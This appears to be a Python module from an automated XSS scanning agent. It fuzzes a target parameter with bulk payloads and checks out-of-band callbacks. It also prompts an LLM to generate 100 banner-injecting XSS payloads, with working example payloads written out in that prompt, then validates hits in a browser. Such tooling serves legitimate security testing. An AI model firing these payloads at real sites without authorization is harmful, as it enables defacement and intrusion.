"""
Pipeline v2 shell: bombardment → analysis → LLM visual → amplify → attack → validation.

Extracted from xss_agent.py so no single shell file exceeds the agent-workable
limit (hard max 1500 LOC per module). XSSAgent composes this mixin.
"""
from __future__ import annotations

# --- shell runtime deps (mixin methods used these from xss_agent module scope) ---
import asyncio
import aiohttp
import json
import re
import urllib.parse
import html as html_module
from dataclasses import asdict
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple, Union, Iterable

from bugtrace.utils.logger import get_logger
from bugtrace.core.ui import dashboard
from bugtrace.core.config import settings
from bugtrace.core.llm_client import llm_client
from bugtrace.core.http_manager import http_manager, ConnectionProfile
from bugtrace.core.queue import queue_manager
from bugtrace.core.event_bus import EventType
from bugtrace.core.verbose_events import create_emitter
from bugtrace.core.validation_status import ValidationStatus, requires_cdp_validation, get_validation_status
from bugtrace.schemas.validation_feedback import ValidationFeedback, FailureReason
from bugtrace.tools.interactsh import InteractshClient
from bugtrace.tools.visual.verifier import XSSVerifier
from bugtrace.tools.headless import detect_dom_xss, detect_dom_xss_batch
from bugtrace.tools.external import external_tools
from bugtrace.tools.go_bridge import GoFuzzerBridge, FuzzResult, Reflection
from bugtrace.utils.payload_amplifier import PayloadAmplifier
from bugtrace.memory.payload_learner import PayloadLearner
from bugtrace.tools.manipulator.orchestrator import ManipulatorOrchestrator
from bugtrace.tools.manipulator.models import MutableRequest, MutationStrategy
from bugtrace.tools.manipulator.context_analyzer import ContextAnalyzer, ReflectionContext
from bugtrace.tools.waf import waf_fingerprinter, strategy_router, encoding_techniques
from bugtrace.agents.worker_pool import WorkerPool, WorkerConfig
from bugtrace.agents.specialist_utils import load_full_payload_from_json, load_full_finding_data
from bugtrace.reporting.standards import (
    get_cwe_for_vuln,
    get_remediation_for_vuln,
    normalize_severity,
    get_default_severity,
)
from bugtrace.agents.xss import coverage as xss_coverage
from bugtrace.agents.xss.types import XSSFinding, InjectionContext, ValidationMethod
from bugtrace.agents.xss.constants import (
    PROBE_STRING,
    PROBE_STRING_SAFE,
    OMNIPROBE_PAYLOAD,
    GOLDEN_PAYLOADS,
    FRAGMENT_PAYLOADS,
)
from bugtrace.agents.xss.finding_builder import (
    mask_auth_headers as _mask_auth_headers,
    auth_meta as _auth_meta,
    excerpt_around as _excerpt_around,
    build_raw_http as _build_raw_http,
    promote_repro as _promote_repro,
)
from bugtrace.agents.xss.waf import (
    detect_payload_encoding as _pure_detect_payload_encoding,
    record_bypass_result as _pure_record_bypass_result,
    get_waf_optimized_payloads as _pure_get_waf_optimized_payloads,
)
logger = get_logger(__name__)
from bugtrace.agents.xss.shell_constants import (
    _BROWSER_ONLY_CONTEXTS,
    _CDP_PROOF_LOCK,
    _L05_CHAR_PROBE,
    _LEGACY_PROBE_MARKER,
    _PROBE_NO_REFLECTION,
    _PROBE_NO_RESPONSE,
    _PROBE_REFLECTED,
    _REDIRECT_PARAM_SET,
    _REFLECTION_SNIPPET_RADIUS,
)
from bugtrace.agents.xss.context_reflection import as_context_set as _as_context_set
# --- end shell runtime deps ---

class XSSPipelineV2Mixin:
    """Imperative shell methods for XSS hybrid / pipeline flows."""

    async def _run_pipeline_v2(
        self,
        param: str,
        interactsh_domain: str,
        screenshots_dir: Path
    ) -> Optional[XSSFinding]:
        """
        Main orchestrator for Pipeline V2: Bombardment-First approach.

        Args:
            param: Parameter to test
            interactsh_domain: Interactsh callback domain
            screenshots_dir: Directory for screenshots

        Returns:
            XSSFinding if XSS confirmed, None otherwise
        """
        interactsh_url = f"http://{interactsh_domain}" if interactsh_domain else ""

        # Create XSS report directory
        xss_report_dir = self.report_dir / "specialists" / "xss"
        xss_report_dir.mkdir(parents=True, exist_ok=True)

        dashboard.log(f"[{self.name}] 🚀 Pipeline V2: Starting bombardment-first approach on '{param}'", "INFO")

        # =====================================================================
        # PHASE 1: BOMBARDEO TOTAL
        # Fire ALL payloads at once - curated + proven + golden
        # =====================================================================
        phase1_result = await self._pipeline_v2_phase1_bombardment(
            param=param,
            interactsh_url=interactsh_url,
            report_dir=xss_report_dir
        )

        if not phase1_result:
            dashboard.log(f"[{self.name}] Phase 1 failed or no reflections", "WARN")
            return None

        fuzz_result, payloads_sent = phase1_result

        # =====================================================================
        # PHASE 2: ANÁLISIS
        # Analyze what reflected, in what context, what escaping applied
        # =====================================================================
        analysis = await self._pipeline_v2_phase2_analysis(
            fuzz_result=fuzz_result,
            report_dir=xss_report_dir
        )

        # Check if Interactsh confirmed (100% confidence - skip to Phase 4)
        if analysis.get("interactsh_confirmed"):
            dashboard.log(f"[{self.name}] 🎯 Interactsh callback received! XSS CONFIRMED.", "SUCCESS")
            finding = self._create_finding_from_interactsh(
                param=param,
                payload=analysis["confirmed_payload"],
                evidence=analysis["evidence"],
                screenshots_dir=screenshots_dir
            )
            self._save_phase4_report(xss_report_dir, finding, "interactsh")
            return finding

        # If no reflections at all, abort
        if not analysis.get("reflections"):
            dashboard.log(f"[{self.name}] Phase 2: No reflections found, aborting", "WARN")
            return None

        # =====================================================================
        # PHASE 3.1: LLM VISUAL GENERATION
        # Generate ~100 payloads with "HACKED BY BUGTRACEAI" based on reflections
        # =====================================================================
        visual_payloads = await self._pipeline_v2_phase3_llm_visual(
            reflections=analysis["reflections"],
            contexts=analysis["contexts"],
            escaping=analysis["escaping"]
        )

        # =====================================================================
        # PHASE 3.2: AMPLIFICATION
        # Multiply visual payloads by breakouts.json prefixes
        # =====================================================================
        amplified_payloads = self._pipeline_v2_phase3_amplify(
            visual_payloads=visual_payloads,
            contexts=analysis["contexts"]
        )

        # =====================================================================
        # PHASE 3.3: SECOND BOMBARDMENT
        # Fire amplified payloads with Go fuzzer
        # =====================================================================
        phase3_result = await self._pipeline_v2_phase3_attack(
            param=param,
            payloads=amplified_payloads,
            report_dir=xss_report_dir
        )

        # =====================================================================
        # PHASE 4: VALIDATION
        # Conditional Playwright - skip if high confidence from HTTP
        # =====================================================================
        finding = await self._pipeline_v2_phase4_validation(
            param=param,
            phase1_result=fuzz_result,
            phase3_result=phase3_result,
            analysis=analysis,
            screenshots_dir=screenshots_dir,
            report_dir=xss_report_dir
        )

        return finding

    async def _pipeline_v2_phase1_bombardment(
        self,
        param: str,
        interactsh_url: str,
        report_dir: Path
    ) -> Optional[Tuple["FuzzResult", List[str]]]:
        """
        Phase 1: BOMBARDEO TOTAL - Fire ALL payloads at once.

        Combines:
        - OMNIPROBE_PAYLOAD (for context detection)
        - curated_list (highest priority)
        - proven_payloads (dynamic memory)
        - GOLDEN_PAYLOADS (defaults)

        Args:
            param: Parameter to fuzz
            interactsh_url: Interactsh callback URL for OOB detection
            report_dir: Directory to save phase report

        Returns:
            Tuple of (FuzzResult, list of payloads sent)
        """
        dashboard.log(f"[{self.name}] ⚡ Phase 1: BOMBARDEO TOTAL on '{param}'", "INFO")
        dashboard.set_status("XSS Phase 1", f"Bombarding {param}")

        # Build mega payload list
        all_payloads = []
        seen = set()

        # 1. OMNIPROBE first (for context detection)
        all_payloads.append(self.OMNIPROBE_PAYLOAD)
        seen.add(self.OMNIPROBE_PAYLOAD)

        # 2. Curated list (highest priority) - use PayloadLearner
        prioritized = self.payload_learner.get_prioritized_payloads(
            default_list=self.GOLDEN_PAYLOADS
        )

        for p in prioritized:
            # Replace Interactsh placeholder
            payload = p.replace("{{interactsh_url}}", interactsh_url) if interactsh_url else p
            if payload not in seen:
                all_payloads.append(payload)
                seen.add(payload)

        # 3. Fragment payloads for DOM XSS
        for fp in self.FRAGMENT_PAYLOADS:
            payload = fp.replace("{{interactsh_url}}", interactsh_url) if interactsh_url else fp
            if payload not in seen:
                all_payloads.append(payload)
                seen.add(payload)

        dashboard.log(f"[{self.name}] 📦 Phase 1: {len(all_payloads)} payloads ready to fire", "INFO")

        # Fire using Go fuzzer
        if not self._go_bridge:
            await self._init_hybrid_engine()

        if not self._go_bridge:
            logger.error(f"[{self.name}] Go bridge unavailable, cannot run Phase 1")
            return None

        result = await self._go_bridge.run(
            url=self.url,
            param=param,
            payloads=all_payloads
        )

        # Save phase report
        self._save_phase1_report(report_dir, param, all_payloads, result)

        dashboard.log(
            f"[{self.name}] 📊 Phase 1 complete: {result.total_requests} requests, "
            f"{len(result.reflections)} reflections @ {result.requests_per_second:.1f} req/s",
            "INFO"
        )

        return (result, all_payloads)

    async def _pipeline_v2_phase2_analysis(
        self,
        fuzz_result: "FuzzResult",
        report_dir: Path
    ) -> Dict[str, Any]:
        """
        Phase 2: ANÁLISIS - Analyze all responses from Phase 1.

        Determines:
        - Which payloads reflected
        - In what context (JS string, HTML attr, etc.)
        - What escaping the server applied
        - If Interactsh callback was received

        Args:
            fuzz_result: Results from Phase 1 bombardment
            report_dir: Directory to save phase report

        Returns:
            Analysis dict with reflections, contexts, escaping, and confirmation status
        """
        dashboard.log(f"[{self.name}] 🔍 Phase 2: Analyzing {len(fuzz_result.reflections)} reflections", "INFO")
        dashboard.set_status("XSS Phase 2", "Analyzing responses")

        analysis = {
            "reflections": [],
            "contexts": set(),
            "escaping": {},
            "interactsh_confirmed": False,
            "confirmed_payload": None,
            "evidence": {},
            "high_confidence_candidates": []
        }

        # Check Interactsh for callbacks
        if self.interactsh:
            try:
                interactions = await self.interactsh.poll()
                if interactions:
                    analysis["interactsh_confirmed"] = True
                    # Find the payload that triggered the callback
                    for ref in fuzz_result.reflections:
                        if "interactsh" in ref.payload.lower() or self.interactsh.domain in ref.payload:
                            analysis["confirmed_payload"] = ref.payload
                            break
                    analysis["evidence"] = {
                        "method": "Interactsh OOB Callback",
                        "interactions": len(interactions),
                        "confidence": 1.0
                    }
                    dashboard.log(f"[{self.name}] 🎯 Interactsh confirmed XSS!", "SUCCESS")
            except Exception as e:
                logger.debug(f"Interactsh poll error: {e}")

        # Analyze each reflection
        for ref in fuzz_result.reflections:
            reflection_data = {
                "payload": ref.payload,
                "context": ref.context,
                "encoded": ref.encoded,
                "encoding_type": ref.encoding_type,
                "status_code": ref.status_code,
                "is_suspicious": ref.is_suspicious
            }
            analysis["reflections"].append(reflection_data)
            analysis["contexts"].add(ref.context)

            # Track escaping per context
            if ref.encoded:
                if ref.context not in analysis["escaping"]:
                    analysis["escaping"][ref.context] = []
                analysis["escaping"][ref.context].append(ref.encoding_type)

            # High confidence candidates (unencoded in dangerous context)
            if ref.is_suspicious:
                analysis["high_confidence_candidates"].append(ref)

        analysis["contexts"] = list(analysis["contexts"])

        # Save phase report
        self._save_phase2_report(report_dir, analysis)

        dashboard.log(
            f"[{self.name}] 📊 Phase 2 complete: {len(analysis['reflections'])} reflections, "
            f"contexts={analysis['contexts']}, high_conf={len(analysis['high_confidence_candidates'])}",
            "INFO"
        )

        return analysis

    async def _pipeline_v2_phase3_llm_visual(
        self,
        reflections: List[Dict],
        contexts: List[str],
        escaping: Dict[str, List[str]]
    ) -> List[str]:
        """
        Phase 3.1: LLM Visual Generation - Generate ~100 payloads with banner.

        Takes the payloads that REFLECTED and asks LLM to create versions
        that display "HACKED BY BUGTRACEAI" banner.

        Args:
            reflections: List of reflection data from Phase 2
            contexts: List of detected contexts
            escaping: Escaping info per context

        Returns:
            List of ~100 visual payloads
        """
        dashboard.log(f"[{self.name}] 🎨 Phase 3.1: Generating visual payloads via LLM", "INFO")
        dashboard.set_status("XSS Phase 3.1", "LLM visual generation")

        # Get top reflections to use as seeds
        working_payloads = []
        for ref in reflections[:20]:  # Top 20 that reflected
            working_payloads.append({
                "payload": ref["payload"],
                "context": ref["context"]
            })

        if not working_payloads:
            # Fallback: use GOLDEN_PAYLOADS if nothing reflected
            dashboard.log(f"[{self.name}] No reflections, using GOLDEN_PAYLOADS as seeds", "WARN")
            working_payloads = [{"payload": p, "context": "unknown"} for p in self.GOLDEN_PAYLOADS[:10]]

        # Format for LLM
        payloads_str = "\n".join([
            f"- Payload: {p['payload'][:100]}... (context: {p['context']})"
            for p in working_payloads[:10]
        ])

        contexts_str = ", ".join(contexts) if contexts else "unknown"
        escaping_str = json.dumps(escaping, indent=2) if escaping else "none detected"

        prompt = f"""You are an elite XSS expert. These payloads REFLECTED on the target:

{payloads_str}

Detected contexts: {contexts_str}
Server escaping behavior: {escaping_str}

YOUR MISSION: Generate 100 XSS payloads that will inject a VISIBLE RED BANNER with text "HACKED BY BUGTRACEAI".

CRITICAL RULES:
1. Keep the breakout technique that made the original payload reflect
2. Use BACKTICKS (`) for strings to avoid escaping issues
3. The banner MUST be visible at top of page with this style:
   position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999

4. VARY your approaches:
   - Different DOM manipulation (createElement, innerHTML, insertAdjacentHTML)
   - Different event handlers (onerror, onload, onfocus, ontoggle)
   - Different elements (div, img, svg, iframe, details)
   - Different quote styles (`, ', ")
   - Different breakout prefixes (\\', \\", '>, ">, </script>)

EXAMPLE PAYLOADS:
\\';var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//
"><div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;z-index:99999">HACKED BY BUGTRACEAI</div>
<svg onload="var d=document.createElement('div');d.id='bt-pwn';d.style='position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;z-index:99999';d.innerText='HACKED BY BUGTRACEAI';document.body.prepend(d)">

Return EXACTLY 100 payloads, one per line, no explanations, no numbering."""

        try:
            response = await llm_client.generate(
                prompt=prompt,
                module_name="XSS-VisualGen-V2",
                model_override=settings.MUTATION_MODEL,
                temperature=0.8,  # Higher for variety
                max_tokens=8000   # Need space for 100 payloads
            )

            if not response:
                return self._fallback_visual_payloads()

            # Parse payloads
            visual_payloads = []
            for line in response.strip().split("\n"):
                line = line.strip()
                if not line or line.startswith("#") or line.startswith("//"):
                    continue
                # Remove numbering
                if len(line) > 2 and line[0].isdigit() and line[1] in ".):":
                    line = line[2:].strip()
                if line and len(line) > 15:
                    visual_payloads.append(line)

            dashboard.log(f"[{self.name}] 🎯 Phase 3.1: Generated {len(visual_payloads)} visual payloads", "SUCCESS")

            # Ensure we have at least some payloads
            if len(visual_payloads) < 20:
                visual_payloads.extend(self._fallback_visual_payloads())

            return visual_payloads[:100]  # Cap at 100

        except Exception as e:
            logger.warning(f"[{self.name}] Phase 3.1 LLM failed: {e}, using fallback")
            return self._fallback_visual_payloads()

    def _pipeline_v2_phase3_amplify(
        self,
        visual_payloads: List[str],
        contexts: List[str]
    ) -> List[str]:
        """
        Phase 3.2: AMPLIFICATION - Multiply visual payloads by breakouts.json.

        Takes ~100 visual payloads and multiplies by breakout prefixes.
        100 payloads × 13 prefixes = ~1300 payloads

        Args:
            visual_payloads: List of visual payloads from Phase 3.1
            contexts: Detected contexts (affects which breakouts to use)

        Returns:
            Amplified list of payloads
        """
        dashboard.log(f"[{self.name}] 🔄 Phase 3.2: Amplifying {len(visual_payloads)} payloads", "INFO")
        dashboard.set_status("XSS Phase 3.2", "Amplification")

        if not self._payload_amplifier:
            self._payload_amplifier = PayloadAmplifier()

        # Determine priority based on contexts
        max_priority = 2 if any(c in ("javascript", "script", "attribute_value") for c in contexts) else 3

        amplified = self._payload_amplifier.amplify(
            seed_payloads=visual_payloads,
            category="xss",
            max_priority=max_priority,
            deduplicate=True
        )

        dashboard.log(
            f"[{self.name}] 📈 Phase 3.2: {len(visual_payloads)} → {len(amplified)} payloads "
            f"(×{len(amplified) // max(len(visual_payloads), 1)} expansion)",
            "SUCCESS"
        )

        return amplified

    async def _pipeline_v2_phase3_attack(
        self,
        param: str,
        payloads: List[str],
        report_dir: Path
    ) -> "FuzzResult":
        """
        Phase 3.3: SECOND BOMBARDMENT - Fire amplified payloads.

        Uses Go fuzzer for high-speed payload testing.

        Args:
            param: Parameter to fuzz
            payloads: Amplified payload list
            report_dir: Directory to save phase report

        Returns:
            FuzzResult with reflections
        """
        dashboard.log(f"[{self.name}] 🚀 Phase 3.3: Second bombardment ({len(payloads)} payloads)", "INFO")
        dashboard.set_status("XSS Phase 3.3", f"Attacking with {len(payloads)} payloads")

        if not self._go_bridge:
            await self._init_hybrid_engine()

        if not self._go_bridge:
            logger.error(f"[{self.name}] Go bridge unavailable for Phase 3.3")
            return FuzzResult(
                target=self.url,
                param=param,
                total_payloads=0,
                total_requests=0,
                duration_ms=0,
                requests_per_second=0.0
            )

        result = await self._go_bridge.run(
            url=self.url,
            param=param,
            payloads=payloads
        )

        # Save phase report
        self._save_phase3_report(report_dir, param, payloads, result)

        dashboard.log(
            f"[{self.name}] 📊 Phase 3.3 complete: {result.total_requests} requests, "
            f"{len(result.reflections)} reflections @ {result.requests_per_second:.1f} req/s",
            "INFO"
        )

        return result

    async def _pipeline_v2_phase4_validation(
        self,
        param: str,
        phase1_result: "FuzzResult",
        phase3_result: "FuzzResult",
        analysis: Dict,
        screenshots_dir: Path,
        report_dir: Path
    ) -> Optional[XSSFinding]:
        """
        Phase 4: VALIDATION - Conditional Playwright validation.

        SKIP Playwright if:
        - Interactsh confirmed (100% confidence)
        - Unencoded payload in <script> context (95%)
        - Unencoded payload in event handler (90%)

        USE Playwright if:
        - Reflection with partial encoding (60%)
        - Dubious context (hidden, comment) (40%)

        Args:
            param: Parameter name
            phase1_result: Results from Phase 1
            phase3_result: Results from Phase 3.3
            analysis: Analysis from Phase 2
            screenshots_dir: Directory for screenshots
            report_dir: Directory to save phase report

        Returns:
            XSSFinding if validated, None otherwise
        """
        dashboard.log(f"[{self.name}] ✅ Phase 4: Conditional validation", "INFO")
        dashboard.set_status("XSS Phase 4", "Validation")

        # Combine all reflections
        all_reflections = phase1_result.reflections + phase3_result.reflections

        # Sort by confidence (unencoded + dangerous context = highest)
        candidates = sorted(
            all_reflections,
            key=lambda r: (
                r.is_suspicious,
                r.context in ("javascript", "script", "event_handler"),
                not r.encoded
            ),
            reverse=True
        )

        # Check for high-confidence cases that don't need Playwright
        for ref in candidates[:10]:
            confidence = self._calculate_confidence(ref)

            if confidence >= 0.95:
                dashboard.log(
                    f"[{self.name}] 🎯 High confidence ({confidence:.0%}) in {ref.context}, skip Playwright",
                    "SUCCESS"
                )

                finding = self._create_xss_finding(
                    param=param,
                    payload=ref.payload,
                    context=f"Pipeline V2: {ref.context}",
                    validation_method="http_high_confidence",
                    evidence={
                        "method": "HTTP Response Analysis",
                        "context": ref.context,
                        "encoded": ref.encoded,
                        "confidence": confidence
                    },
                    confidence=confidence,
                    reflection_type=ref.context,
                    surviving_chars="",
                    successful_payloads=[ref.payload],
                    injection_ctx=None,
                    bypass_technique="pipeline_v2",
                    bypass_explanation=f"Unencoded reflection in {ref.context} context"
                )

                self._save_phase4_report(report_dir, finding, "high_confidence_http")
                return finding

        # Need Playwright validation for lower confidence candidates
        dashboard.log(f"[{self.name}] 🎭 Running Playwright validation on top candidates", "INFO")

        max_validations = 10
        for i, ref in enumerate(candidates[:max_validations]):
            if self._max_impact_achieved:
                break

            dashboard.set_current_payload(
                f"[{i+1}/{min(len(candidates), max_validations)}]",
                "XSS Validation",
                "Testing via Playwright"
            )

            # Validate via browser
            evidence = await self._validate_via_browser(self.url, param, ref.payload)

            if evidence:
                dashboard.log(f"[{self.name}] ✅ XSS CONFIRMED via Playwright!", "SUCCESS")

                finding = self._create_xss_finding(
                    param=param,
                    payload=ref.payload,
                    context=f"Pipeline V2: {ref.context}",
                    validation_method="playwright_browser",
                    evidence=evidence,
                    confidence=0.95,
                    reflection_type=ref.context,
                    surviving_chars="",
                    successful_payloads=[ref.payload],
                    injection_ctx=None,
                    bypass_technique="pipeline_v2",
                    bypass_explanation=f"Go fuzzer detected reflection, Playwright confirmed execution"
                )

                self._save_phase4_report(report_dir, finding, "playwright")
                return finding

        # No XSS confirmed
        dashboard.log(f"[{self.name}] Phase 4: No XSS confirmed after {max_validations} validations", "WARN")
        self._save_phase4_report(report_dir, None, "no_finding")
        return None

